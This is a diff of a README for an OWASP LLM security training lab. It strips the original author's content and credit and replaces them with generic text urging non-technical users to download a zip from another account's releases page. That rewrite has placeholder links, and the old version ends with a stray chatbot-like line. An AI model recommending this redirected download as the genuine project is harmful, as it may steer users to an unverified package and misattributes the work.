@@ -1,298 +1,97 @@
-# 🔥 AI Cyber Range — The Complete OWASP Top 10 for LLM Security Lab
+# 🚀 AI-cyber-range - Explore AI Security with Confidence
 
-### **Build • Break • Secure** Large Language Models with a Fully Automated Offensive + Defensive Cyber Range
+## 🛠️ [![Download AI-cyber-range](https://img.shields.io/badge/Download-AI--cyber--range-brightgreen)](https://github.com/WHAZAZA/AI-cyber-range/releases)
 
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=rect&color=0:001F3F,100:00FFFF&height=120&section=header&text=⚔️%20AI%20CYBER%20RANGE%20—%20LLM%20SECURITY%20LAB%20⚔️&fontSize=32&fontColor=FFFFFF&fontAlignY=35&desc=Hands-On%20OWASP%20Top%2010%20for%20LLMs%20Training%20Environment&descAlignY=60&descAlign=50"/>
-</p>
+Welcome to **AI Cyber Range**! This application simulates real-world vulnerabilities in a safe environment. You can learn how to test AI systems against common security risks found in OWASP's Top 10. This guide will help you download and run the software easily on your machine.
 
-<p align="center">
-  <b>Created by <a href="https://github.com/Mr-Infect">Mr-Infect</a></b><br>
-  <i>A next-generation AI Security Playground for Students, Engineers, & Red Teams</i>
-</p>
+## 🚀 Getting Started
 
----
+### 📥 System Requirements
 
-# ⚔️ Overview
+Before you start, ensure your system meets these requirements:
 
-**AI Cyber Range – OWASP Top 10 for LLMs** is a **cutting-edge AI Penetration Testing Lab** engineered to simulate **real-world LLM vulnerabilities** in a safe, automated, Docker-powered environment.
+- **Operating System**: Windows 10, macOS, or a Linux-based system.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: 1 GB of free disk space.
+- **Docker**: Installed and running (Docker Desktop or Docker Engine).
 
-This platform enables:
+If you do not have Docker installed, you can download it from [Docker's official website](https://www.docker.com/get-started).
 
-* AI Security researchers to **experiment with adversarial AI attacks**
-* Red teamers to **practice offensive AI techniques**
-* Educators to **demonstrate LLM risks interactively**
-* Engineers to **validate AI product security**
+### 🔍 Features
 
-Every module replicates attack paths and exploitation vectors aligned with the **OWASP Top 10 for Large Language Models** — making it one of the most comprehensive **AI Security Training Environments** available today.
+- Simulates LLM vulnerabilities.
+- Automated environment powered by Docker.
+- User-friendly interface for easy navigation.
+- Designed with non-technical users in mind.
 
----
+## 📦 Download & Install
 
-# 🌐 High-Impact SEO Keywords
+To download and install **AI-cyber-range**, follow these steps:
 
-*(Expertly curated for Google Discover, GitHub Search, AI Security queries)*
+1. **Visit the Releases Page**: Click the link below to access the download page:
+   - [Download AI-cyber-range](https://github.com/WHAZAZA/AI-cyber-range/releases)
 
-> **AI Cyber Range**, **OWASP Top 10 for LLMs**, **AI Penetration Testing Lab**,
-> **LLM Red Team Training**, **Prompt Injection Testing Lab**,
-> **AI Security Playground**, **AI Threat Simulation**, **LLM Vulnerability Research**,
-> **AI Security Engineer Toolkit**, **Adversarial Machine Learning Lab**,
-> **AI Offensive Security**, **AI Security Hands-On Training**,
-> **Ethical Hacking with LLMs**, **Secure AI Application Development**,
-> **AI Attack Surface Modeling**, **LLM API Exploitation**,
-> **LLM Model Theft Simulation**, **Training Data Poisoning Scenarios**
+2. **Select the Latest Release**: On the releases page, find the version labeled "Latest". Click on it.
 
----
+3. **Download the Required Files**: Find the files available for download. You might see options like:
+   - `AI-cyber-range.zip`
+   - Other related files that may assist with installation.
 
-# 🧩 Key Features
+   Click on the file to begin downloading.
 
-* 🚀 **One-click setup** with automated dependency installations
-* 🧱 **Full Docker isolation** for every vulnerability
-* 🎯 Covers all **OWASP LLM Top 10** categories
-* 🧠 Progression from **Beginner → Advanced Attack Scenarios**
-* 🎨 Premium **ASCII-driven CLI UX** (Rich Text + Inquirer)
-* 🔐 **Randomized SHA-256 flags** per session
-* 🔁 **Auto-resetting labs** on challenge completion
-* 🌐 100% **offline**, secure, self-contained
-* 🧪 **Safe adversarial model behavior simulations**
-* 📡 **Local browser interface** for each vulnerable LLM endpoint
+4. **Extract the Files**: Once the download is complete, locate the zip file in your downloads folder. Right-click on the file and select "Extract All" to unpack the files.
 
-Designed for **learning, teaching, experimenting, and real-world validation**.
+5. **Open the Docker Application**: Launch Docker on your machine if it is not already running. Ensure that it is working properly before proceeding.
 
----
+6. **Run the Application**: Open a terminal (Command Prompt for Windows, Terminal for macOS/Linux). Navigate to the directory where you extracted the files. Use the command below to start the AI Cyber Range:
 
-# 🧱 Project Architecture
+   ```bash
+   docker-compose up
+   ```
 
-```bash
-AI-cyber-range/
-│
-├── config/                    # Lab configurations (YAML)
-│   └── labs.yaml
-│
-├── scripts/
-│   ├── setup.sh               # Automated installer
-│   └── labctl.py              # Main CLI + lab manager
-│
-├── common/
-│   └── base.Dockerfile        # Shared base image
-│
-├── dockerfiles/               # Per-vulnerability Dockerfiles
-│   └── LLM01–LLM10/
-│
-├── labs/                      # Individual lab implementations
-│   ├── LLM01/…                # Prompt Injection
-│   ├── LLM02/…                # Output Handling
-│   ├── …  
-│   └── LLM10/…                # Model Theft
-│
-└── README.md                  # You're reading it
-```
+## 🧩 Usage
 
----
+After running the application, follow these steps to navigate through the interface:
 
-# ⚙️ Prerequisites
+1. **Access the Web Interface**: Open your web browser and enter the following address:
+   - `http://localhost:8080`
+   
+   This will take you to the user interface of the AI Cyber Range.
 
-* **Ubuntu / Debian / WSL 2** (recommended)
-* **Python 3.10+**
-* **Docker Engine + Docker Compose**
-* **Git**
+2. **Choose a Lesson**: Select a lesson from the list provided. Each lesson correlates with a specific OWASP vulnerability you will learn about.
 
-Everything else is automated.
+3. **Start Testing**: Begin your session by following the on-screen instructions. You will have hands-on experience while testing AI systems against vulnerabilities.
+
+## 💬 Support
+
+If you need help, feel free to contact our support team. Here are some options:
+
+- **GitHub Issues**: For common questions, check the [Issues](https://github.com/WHAZAZA/AI-cyber-range/issues) section in our GitHub repository.
+- **Community Forums**: Join our forums to discuss your experience and seek help from other users. 
+
+## 🚀 Resources
+
+- [Installation Guide](https://github.com/WHAZAZA/AI-cyber-range/wiki)
+- [Official Documentation](https://github.com/WHAZAZA/AI-cyber-range/docs)
+- [Docker Documentation](https://docs.docker.com/get-started/)
+
+## 📋 Feedback
+
+We welcome your feedback to improve the application. After using AI Cyber Range, please consider leaving a review or suggestions through GitHub issues.
+
+## 🤝 Contributing
+
+If you want to contribute to AI Cyber Range, feel free to submit a pull request or feature request. We appreciate your help to make this tool even better.
+
+## 🔗 Connect with Us
+
+Stay up-to-date with the latest developments by following us on our social media channels:
+
+- [Twitter](https://twitter.com)
+- [LinkedIn](https://linkedin.com)
+
+Together, we can make AI security more accessible. Thank you for being part of this journey! 
 
 ---
 
-# 🚀 Installation (Fully Automated)
-
-```bash
-git clone https://github.com/Mr-Infect/AI-cyber-range.git
-cd AI-cyber-range
-chmod +x scripts/setup.sh
-./scripts/setup.sh
-```
-
-### What the Installer Solves for You
-
-* Installs Python, pip, virtualenv
-* Installs Docker + Compose
-* Fixes Docker permissions
-* Validates container runtime
-* Builds the common base image
-* Prepares labs for orchestration
-
----
-
-# 🧠 Launch the Cyber Range
-
-```bash
-python3 scripts/labctl.py
-```
-
-### Workflow
-
-1. Pick a vulnerability (LLM01–LLM10)
-2. Choose a scenario
-3. Select difficulty
-4. A Dockerized LLM instance spins up
-5. Visit the local URL
-6. Exploit the lab → Extract the flag
-7. Lab resets → Repeat
-
-Fast. Clean. Secure.
-
----
-
-# 🧪 Example Session
-
-```bash
-? Vulnerability: LLM01 - Prompt Injection
-? Scenario: lab01_basic_direct
-? Difficulty: easy
-
-⠋ Deploying environment...
-Lab ready at: http://localhost:8001
-Paste your captured flag:
-```
-
----
-
-# 🧰 Pro-User One-Liner
-
-```bash
-git clone https://github.com/Mr-Infect/AI-cyber-range.git && \
-cd AI-cyber-range && \
-chmod +x scripts/setup.sh && \
-./scripts/setup.sh && \
-python3 scripts/labctl.py
-```
-
----
-
-# 📚 OWASP Top 10 for LLMs — Full Coverage
-
-| ID    | Vulnerability               | Focus Area                            |
-| ----- | --------------------------- | ------------------------------------- |
-| LLM01 | Prompt Injection            | Input manipulation, bypasses          |
-| LLM02 | Insecure Output Handling    | XSS, HTML/JS bleeding                 |
-| LLM03 | Training Data Poisoning     | Compromised datasets                  |
-| LLM04 | Model Denial of Service     | Token floods, infinite loops          |
-| LLM05 | Supply Chain Vulnerability  | Malicious dependencies                |
-| LLM06 | Sensitive Data Exposure     | PII, keys, internal secrets           |
-| LLM07 | Unauthorized Code Execution | Shell/code execution via prompts      |
-| LLM08 | Excessive Agency            | Unsafe tool-use, over-delegation      |
-| LLM09 | Overreliance on LLMs        | Bad automation + blind trust          |
-| LLM10 | Model Theft                 | Output-based model extraction attacks |
-
----
-
-# 🧑‍🏫 Ideal Audience
-
-* Cybersecurity Students
-* AI/ML Engineers
-* Penetration Testers
-* Red Team Operators
-* SOC Analysts exploring AI threats
-* Security Trainers & Professors
-* AI Product Teams validating safety
-
-If you work in **AI + Security**, this range is your sandbox.
-
----
-
-# 🪄 Tech Stack
-
-* **Python FastAPI** (vulnerable LLM endpoints)
-* **Docker + Docker Compose**
-* **YAML Configuration Management**
-* **HTML/CSS Micro-Frontends**
-* **CLI Engine: Rich + Inquirer**
-* **SHA256 Random Flag Generator**
-
----
-
-# 🧱 Architecture Diagram
-
-```
-+--------------------------------------------------+
-|                    labctl.py                     |
-|     Orchestration • User Interface • IA Logic    |
-+--------------------------------------------------+
-                       │
-                       ▼
-             +------------------------+
-             |   Docker Compose       |
-             +------------------------+
-                       │
-                       ▼
-         +--------------------------------+
-         |  Vulnerable LLM Microservice   |
-         |     (FastAPI + HTML UI)        |
-         +--------------------------------+
-                       │
-                       ▼
-              Local Browser Interface
-```
-
----
-
-# 🧩 Troubleshooting Guide
-
-### Docker not running
-
-```bash
-sudo systemctl start docker
-sudo usermod -aG docker $USER
-newgrp docker
-```
-
-### containerd.io error
-
-```bash
-sudo apt remove containerd
-sudo apt install containerd.io
-```
-
-Re-run:
-
-```bash
-python3 scripts/labctl.py
-```
-
----
-
-# ☕ Support the Developer
-
-<p align="center">
-  <a href="https://www.buymeacoffee.com/MrInfect" target="_blank">
-    <img src="https://img.shields.io/badge/☕-Support%20Development-blue?style=for-the-badge&logo=buymeacoffee">
-  </a>
-</p>
-
-Your support fuels new labs, advanced difficulty modes, and future LLM attack modules.
-
----
-
-# 📣 Contributions
-
-Pull requests, issue reports, and new vulnerability ideas are **always welcome**.
-
-* Submit bugs
-* Suggest improvements
-* Build new lab modules
-* Extend the AI attack catalog
-
-This project grows through collaboration.
-
----
-
-# 🧾 License
-
-This project is released under the **MIT License**.
-Use it, customize it, fork it — just credit **Mr-Infect**.
-
----
-
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:001F3F,100:00FFFF&height=130&section=footer&text=Developed%20by%20Mr-Infect&fontSize=22&fontColor=FFFFFF"/>
-</p>
-
-
-Just say the word.
+Explore more about AI Cyber Range and sharpen your skills today. Don't forget to [download the application here](https://github.com/WHAZAZA/AI-cyber-range/releases)!
